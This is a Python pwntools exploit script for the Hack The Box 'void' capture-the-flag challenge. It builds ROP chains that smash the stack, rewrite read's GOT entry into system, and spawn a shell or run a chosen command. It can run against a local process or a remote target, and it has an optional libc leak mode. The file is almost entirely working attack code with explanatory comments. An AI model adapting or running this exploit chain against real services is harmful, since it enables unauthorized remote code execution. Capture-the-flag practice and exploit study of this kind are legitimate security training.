################################################################################
# HTB-Void-nodlresolve.py
#   Chapter:02
#   Binary: HTB CA2023 "void"
#   Source: --
#   Goal:   Spwan a shell without using ret2dlresolve!
#   https://app.hackthebox.com/challenges/462
################################################################################
from pwn import *

################################################################################
#  writeMemory(addr,value,r)
#       Writes value into addr. It can read up to 0xc8 bytes, Returns to
#       main to continue the ROP-chain attack.
################################################################################
def writeMemory(addr,value,r):

    rop =   b''
    rop +=  p64(pop_rdi)
    rop +=  p64(0x0)
    rop +=  p64(pop_rsi_r15)
    rop +=  p64(addr)                           # rsi
    rop +=  p64(0x0)                            # r15
    # read(0,addr,0xc8);
    rop +=  p64(binary.symbols["plt.read"])
    rop +=  p64(binary.symbols["main"])

    # We send the ROP-chain:
    warning("> Writting %s (%s) at 0x%02x" % (value,value[::-1].hex(),addr))
    r.send(padding + p64(RBP) + rop)
    # And now the value we want at addr:
    r.clean()
    r.send(value)

################################################################################
# ropAdd(addr,value)
#   It adds "value" to the address "addr". If the value is greater than 0xff,
#   it adds the carry to the next byte in the address, so it's a neat solution
#   to overwrite read() with write() for this version of glibc! Moreover, if
#   we add the same number but in its negative form, we restore the previous
#   value!
#  Using r2, we find this ROP-chain:
#  [0x00401122]> /Rq~ebx
#  0x00401101: inc esi; add eax, 0x2f27; add dword [rbp - 0x3d], ebx; 
#              nop dword [rax + rax]; ret;
#   So because we know which version of libc6 the server is running, we can
#   compute how far system is from read (in its negative form):
#       gef➤  p system - read
#           $2 = 0xfffffffffff596d0
#   Because we can only ADD, we will ADD this negative offset to read()
#   so it will become system right away. It's not perfect; we cannot perform
#   add qword [rbp - 0x3d], rbx so the exploit is not 100% reliable!
################################################################################
def ropAdd(addr,value):

    rop =   b''
    rop +=  p64(ret2csu_pop)        # pop rbx;rbp;r12;r13;r14;r15
    rop +=  p64(value)              # rbx = value
    rop +=  p64(addr+0x3d)          # rbp = addr+0x3d
    for i in range(0,4):
        rop +=  p64(0x0)            # r12,r13,r14,r15

    #0x00401108      015dc3         add dword [rbp - 0x3d], ebx
    #0x0040110b      0f1f440000     nop dword [rax + rax]
    #0x00401110      c3             ret
    rop +=  p64(0x00401108)         # Sets addr to *addr+=value

    warning("+ ropAdd():\t%d bytes " % len(rop))

    return rop

################################################################################
#   ropShell()
#       Constructs and returns a simple ROP-chain to run system(command).
#       We have the command written in the .bss section.
################################################################################
def ropShell():

    rop =   b''
    rop +=  p64(pop_rdi)
    rop +=  p64(command_addr)
    rop +=  p64(ret)
    rop +=  p64(binary.symbols["plt.read"])

    return rop

def ropLeakData():

    # At this point, read() -> write().
    rop =   b''
    rop +=  p64(pop_rdi)
    rop +=  p64(0x1)                        # stdout
    rop +=  p64(pop_rsi_r15)                
    rop +=  p64(binary.symbols["got.read"]) # We know its write()!
    rop +=  p64(0x0)
    rop +=  p64(binary.symbols["plt.read"]) # write(1,write@got,rxd)

    return rop

# Binary protections:
# checksec --file void
#    Arch:     amd64-64-little
#    RELRO:    Partial RELRO
#    Stack:    No canary found          We can smash the stack as we please
#    NX:       NX enabled               We need ROP (stack is non-executable)
#    PIE:      No PIE (0x400000)        We don't need a memory leak
vuln    =   "./void"
binary  =   ELF(vuln)

# We control EIP after padding + RBP:
padding =   b'A'*64
# A fake RBP value:
RBP     =   0x0

# We can change the offset where our command will be written:
if args.BSS:
    command_addr    =   binary.bss(int(args.BSS,16))
else:
    command_addr    =   binary.bss(0x300)

# Using ropper, we find the following ROP-gadgets we will need:
# pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
ret2csu_pop  =   0x004011b2
# pop rdi;ret
pop_rdi      =   0x04011bb
# pop rsi;pop r15;ret
pop_rsi_r15  =   0x04011b9
# ret
ret          =   0x0401016

# Offsets from system, execve (negative values!)
# gef➤  p system - read
#   $2 = 0xfffffffffff596d0
system_offt =   0xfffffffffff596d0

# It runs the command passed as an argument or it opens a shell instead:
if args.CMD != "":
    command =   args.CMD.encode('ascii')
    command +=  b'\x00'
else:
    command =   b'/bin/sh\x00'

# Are we dealing with the live instance or a local process?
if args.REMOTE:
    r = remote(args.TARGET.split(':')[0],int(args.TARGET.split(':')[1]))
else:
    r   =   process(binary.path)

# We write the command into the .bss section:
warning("Writting command %s into address 0x%02x" % (command,command_addr))
writeMemory(command_addr,command,r)

# Do we want to leak libc6?
if args.LEAK:
    warning("Only leaking libc6 addresses ... ")
    payload =   padding \
            + p64(RBP) \
            + ropAdd(binary.symbols["got.read"],0xa0) \
            + ropLeakData() \
            + p64(binary.symbols["main"])
    warning("Payload is: %d" % len(payload))
    r.send(payload)# So here's our leak:

    write_leak = int(r.recv(6)[::-1].hex(),16)
    warning("Libc6 write leak! 0x%02x" % write_leak)

    # Now we can compute libc6's base address:
    libc6 = ELF("./glibc/libc.so.6")
    libc6_base_addr =   write_leak - libc6.symbols["write"]
    warning("libc6 base address is: 0x%02x" % libc6_base_addr)

    # System and /bin/sh as usual too:
    system  =   libc6_base_addr + libc6.symbols["system"]
    bin_sh  =   next(libc6.search(b'/bin/sh')) + libc6_base_addr
    warning("System at 0x%02x, '/bin/sh' at 0x%02x" % (system,bin_sh))

    r.close()
    sys.exit(0)

# Our payload is very simple; we just add the negative number to got@read for
# system offset so that got@read becomes system right away; then we set RDI
# to our command and call read@plt (now system) to gain a shell:
payload = padding \
         + p64(RBP) \
         + ropAdd(binary.symbols["got.read"],system_offt) \
         + ropShell()
warning("Payload is: %d" % len(payload))
r.send(payload)
if args.CMD != "":
    info("Receiving command output now...")
    warning(r.recvall().decode('ascii'))
else:
    r.clean()
    r.interactive()
r.close()
